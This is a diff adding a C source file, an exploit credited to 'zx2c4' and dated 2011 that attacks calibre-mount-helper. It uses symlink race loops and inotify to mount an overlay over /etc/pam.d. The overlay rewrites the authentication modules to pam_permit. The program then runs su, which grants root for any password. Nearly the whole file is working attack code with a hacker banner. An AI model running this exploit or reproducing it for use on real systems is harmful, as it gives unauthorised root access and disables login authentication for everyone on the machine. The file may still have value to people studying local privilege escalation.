@@ -1,0 +1,103 @@
+/*
+ * ########################################################
+ * #               .80 Calibrer Assault Mount             #
+ * #                         by zx2c4                     #
+ * ########################################################
+ * 
+ * Yesterday's assult mount used inotify to mount into /etc/pam.d. Today we
+ * expand the attack by adding a race toggler so we can mount from non-block
+ * devices.
+ * 
+ * Enjoy.
+ * 
+ * - zx2c4
+ * 2011-11-4
+ * 
+ * greets to djrbliss
+ * 
+ */
+
+
+#include <stdio.h>
+#include <sys/inotify.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <signal.h>
+
+int main(int argc, char **argv)
+{
+	printf("########################################################\n");
+	printf("#               .80 Calibrer Assault Mount             #\n");
+	printf("#                         by zx2c4                     #\n");
+ 	printf("########################################################\n\n");
+	
+	
+	printf("[+] Cleaning up old cruft.\n");
+	unlink("/dev/shm/overlay");
+	system("calibre-mount-helper cleanup /dev/ram0 /media/staging/");
+	
+	printf("[+] Creating overlay container.\n");
+	system("dd if=/dev/zero of=/dev/shm/overlay count=25600");
+	system("/usr/sbin/mkfs.ntfs /dev/shm/overlay");
+	
+	printf("[+] Mounting staging using race condition toggler...\n");
+	int childpid = fork();
+	if (childpid) {
+		int ret;
+		while ((ret = system("calibre-mount-helper mount /dev/shm/overlay /media/staging/ 2>&1")) == 256 || ret == 8192);
+		kill(childpid, SIGKILL);
+	} else {
+		while (1) {
+			rename("/dev/shm/overlay", "/dev/shm/overlay-holder");
+			symlink("/dev/ram0", "/dev/shm/overlay");
+			unlink("/dev/shm/overlay");
+			rename("/dev/shm/overlay-holder", "/dev/shm/overlay");
+		}
+		return 0;
+	}
+	
+	printf("[+] Preparing overlay with /etc/pam.d modification:\n");
+	system("cp -v /etc/pam.d/* /media/staging/");
+	system("sed -i \"s/pam_deny.so/pam_permit.so/g\" /media/staging/common-auth");
+	system("sed -i \"s/pam_cracklib.so.*/pam_permit.so/g\" /media/staging/system-auth");
+	system("sed -i \"s/pam_unix.so.*/pam_permit.so/g\" /media/staging/system-auth");
+	
+		
+	printf("[+] Mounting overlay over /etc/pam.d using race condition toggler and inotify...\n");
+	childpid = fork();
+	if (childpid) {
+		int childpid2 = fork();
+		if (childpid2) {
+			int ret;
+			while ((ret = system("calibre-mount-helper mount /dev/shm/overlay /etc/pam.d/ 2>&1")) == 256 || ret == 8192);
+			kill(childpid, SIGKILL);
+			kill(childpid2, SIGKILL);
+		} else {
+			while (1) {
+				int fd;
+				fd = inotify_init();
+				unlink("/media/staging/fake");
+				mkdir("/media/staging/fake");
+				inotify_add_watch(fd, "/media/staging/fake", IN_CREATE);
+				read(fd, 0, 0);
+				rename("/media/staging/fake", "/media/staging/tmp");
+				symlink("/etc/pam.d", "/media/staging/fake");
+				rmdir("/media/staging/tmp");
+				close(fd);
+			}
+		}
+	} else {
+		while (1) {
+			rename("/dev/shm/overlay", "/dev/shm/overlay-holder");
+			symlink("/dev/ram0", "/dev/shm/overlay");
+			unlink("/dev/shm/overlay");
+			rename("/dev/shm/overlay-holder", "/dev/shm/overlay");
+		}
+		return 0;
+	}
+	
+	printf("[+] Asking for root. When prompted for a password, type anything and press enter.\n");
+	system("su");
+	
+	return 0;
+}
